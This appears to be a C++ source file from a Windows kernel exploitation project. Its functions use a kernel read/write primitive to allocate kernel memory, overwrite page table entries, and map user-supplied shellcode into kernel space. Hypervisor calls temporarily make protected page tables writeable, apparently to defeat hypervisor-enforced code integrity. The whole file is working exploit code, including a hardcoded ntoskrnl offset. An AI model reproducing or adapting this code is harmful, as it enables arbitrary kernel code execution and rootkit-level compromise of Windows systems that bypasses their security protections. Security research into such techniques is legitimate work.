#include "kernel.hpp"
#include "win_defs.h"
#include <phnt_windows.h>
#include <phnt.h>

#include "hv.h"

namespace collat::kernel {
    void* alloc_exec_mem(size_t size) {
        void* mdl = kernel::call<void*>(
            "ntoskrnl.exe",
            "MmAllocatePagesForMdlEx",
            0, (UINT64)-1, 0, size, 0, 0
        );

        if(!mdl) {
            spdlog::error("failed to allocate pages for mdl");
            return nullptr;
        }

        void* address = kernel::call<void*>(
            "ntoskrnl.exe",
            "MmMapLockedPagesSpecifyCache",
            mdl,
            0,
            0,
            NULL,
            FALSE,
            16
        );

        return address;
    }

    /// @brief Locks a user-mode virtual address in physical memory
    /// @param user_va Pointer to the user-mode memory
    /// @param size Size of the buffer
    /// @return A pointer to the kernel-mode virtual address.
    void* lock_va(void* user_va, size_t size) {
        void* mdl = call<void*>("ntoskrnl.exe", "IoAllocateMdl", user_va, size, FALSE, FALSE, NULL);
        void* kernel_va = nullptr;
        if(mdl) {
            call<void*>("ntoskrnl.exe", "MmProbeAndLockPages", mdl, 1, 2);

            kernel_va = call<void*>("ntoskrnl.exe", "MmMapLockedPagesSpecifyCache", mdl, 0, 0, NULL, FALSE, 16);
        }
        return kernel_va;
    }

    void* map_krnl_shellcode(char* shellcode, size_t scsize) {
        if(scsize >0x1000) return nullptr;

        auto mem = kernel::get_ioring();

        void* page = VirtualAlloc(nullptr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memset(page, 0xc3, 0x1000); // pad page with rets
        memcpy(page, shellcode, scsize);
        

        DWORD old;
        VirtualProtect(page, 0x1000, PAGE_EXECUTE, &old);

        // create new kernel pool
        size_t size = 1 << 0xc;
        //auto pool = kernel::call<void*>("ntoskrnl.exe", "ExAllocatePool2", 0x0000000000000080UI64, size, 'nwpC');
        auto pool = alloc_exec_mem(size);
        
    /* spdlog::info("allocating mdl");
        void* pmdl = kernel::call<void*>("ntoskrnl.exe", "IoAllocateMdl", pool, size, 0, 0, NULL);
        spdlog::info("locking");
        auto res = kernel::call<void*>("ntoskrnl.exe", "MmProbeAndLockPages", pmdl, 1, 0); // crash
        spdlog::info("done");*/

        uint64_t one = 1;

        kernel::call<void*>("ntoskrnl.exe", "memcpy", pool, &one, 8);
        spdlog::info("allocated pool @ {}", pool);
        uint64_t pool_pa = kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", pool) & 0xfffffffffffff000;
        spdlog::info("pool pa: 0x{:x}", pool_pa);

        // get pte for kernel pool
        auto pte = kernel::get_pagetable_entry((uint64_t)pool);
        auto pool_pte_addr = kernel::get_pte_address((uint64_t)pool);
        auto pte_addr_from_fn = kernel::call<uint64_t>((void*)((uint64_t)kmodule::get_base("ntoskrnl.exe") + 0x3f5b60), pool);
        spdlog::info("nx: [{}] u/s: [{}] write: [{}] valid: [{}]", (bool)pte.u.Hard.NoExecute, (bool)pte.u.Hard.Owner, (bool)pte.u.Hard.Write, (bool)pte.u.Hard.Valid);
        spdlog::info("pte: 0x{:x}", (uint64_t)pte.u.Long);
        spdlog::info("pte addr: 9x{:x}, from mi: 0x{:x}", pool_pte_addr, pte_addr_from_fn);

        auto p = mem->raw_read<MMPTE>((void*)pte_addr_from_fn);
        
        spdlog::info("pte read: 0x{:x}", p.u.Hard.PageFrameNumber<<0xc);

        // get the PTE physical address for use in hypercall
        uint64_t pte_pa = kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", pool_pte_addr) & 0xfffffffffffff000;
        
        
        spdlog::info("got physical");

        uint64_t repc = 1;
        uint64_t out;
        
        // make the page table writeable
        
        spdlog::info("made pte writeable");

        // setup new pte
        auto infloop_pte = kernel::get_pagetable_entry((uint64_t)page&0xfffffffffffff000);
        auto infloop_pfn = infloop_pte.u.Hard.PageFrameNumber;
        pte.u.Hard.NoExecute = FALSE;
        pte.u.Hard.Write = FALSE;
        pte.u.Hard.PageFrameNumber = infloop_pfn;
        spdlog::info("infloop pa: 0x{:x}", infloop_pfn<<0xc);

        // overwrite `pool`s PTE with our new one which points to (user) executable memory containing infloop.
        hv::make_data_page_writeable(&pte_pa, 1, &out, 8, &repc);
        mem->write64(pool_pte_addr, pte.u.Long);
        repc = 1;
        out = 0;
        hv::make_data_page_readonly(&pte_pa, 1, &out, 8, &repc);
        spdlog::info("overwritten pte to: 0x{:x}", pte.u.Long);

        // read bytes from infloop to validate PFN update
        auto addr = (void*)(((uint64_t)pool) + ((uint64_t)page&0xfff));
        spdlog::info("addr: {}, infloop: {}", addr, (void*)page);
        auto code = mem->raw_read<uint64_t>(addr);
        spdlog::info("code: {:x}", code);

        return addr;
    }

    void* map_code_into_kernel(void* code, size_t size) {
        auto mem = get_ioring();

        auto mapped = alloc_exec_mem(size);

        auto kernel_pte = get_pagetable_entry(reinterpret_cast<uint64_t>(mapped));
        auto kernel_pte_address = get_pte_address(reinterpret_cast<uint64_t>(mapped));
        auto code_pte = get_pagetable_entry(reinterpret_cast<uint64_t>(code));

        auto kernel_pte_page = kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", kernel_pte_address) & 0xfffffffffffff000;

        kernel_pte.u.Hard.NoExecute = FALSE;
        kernel_pte.u.Hard.Write = FALSE;
        kernel_pte.u.Hard.PageFrameNumber = code_pte.u.Hard.PageFrameNumber;

        uint64_t out;
        uint64_t repcnt = 1;
        hv::make_data_page_writeable(&kernel_pte_page, 1, &out, 8, &repcnt);

        mem->write64(kernel_pte_address, kernel_pte.u.Long);

        repcnt = 1;
        hv::make_data_page_readonly(&kernel_pte_page, 1, &out, 8, &repcnt);

        return mapped;
    }
}